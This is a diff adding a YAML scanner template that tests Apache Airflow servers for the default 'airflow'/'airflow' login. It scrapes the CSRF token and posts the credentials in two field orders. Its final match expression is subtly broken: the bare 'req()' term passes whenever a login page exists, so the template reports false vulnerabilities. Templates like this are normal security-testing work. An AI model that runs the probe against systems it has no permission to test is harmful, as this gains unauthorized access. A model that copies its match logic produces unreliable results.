@@ -1,0 +1,56 @@
+id: 
+name: Airflow-Default-Login
+tags: 
+  - Apahce-Airflow
+transport: http
+set:
+  BaseURL: request.url.scheme + '://' + request.url.domain
+rules: 
+  req: 
+    request: 
+      cache: false
+      method: GET
+      path: /login/?next={{BaseURL}}/home
+      headers:
+        Origin: '{{BaseURL}}'
+    expression: response.body.bcontains(b'Sign In - Airflow')
+    output: 
+      csrf: r'csrf_token" type="hidden" value="(.*?)">'.bsubmatch(response.body)['1']
+
+  req2: 
+    request: 
+      cache: false
+      method: POST
+      path: /login/?next={{BaseURL}}/home
+      headers:
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}/login/'
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        csrf_token={{csrf}}&username=airflow&password=airflow
+
+    expression: response.status==302 &&
+                'Set-Cookie' in response.headers && response.headers['Set-Cookie'].contains('session') &&
+                response.body.bcontains(b'You should be redirected automatically to target URL')
+
+  req3: 
+    request: 
+      cache: false
+      method: POST
+      path: /login/?next={{BaseURL}}/home
+      headers:
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}/login/'
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        username=airflow&password=airflow&csrf_token={{csrf}}
+
+    expression: response.status==302 &&
+                'Set-Cookie' in response.headers && response.headers['Set-Cookie'].contains('session') &&
+                response.body.bcontains(b'You should be redirected automatically to target URL')
+
+expression: req() && req2() || req() || req3()
+detail:
+  vulnerability:
+    proof:
+      info: "存在Airflow-Default-Login 默认密码漏洞"
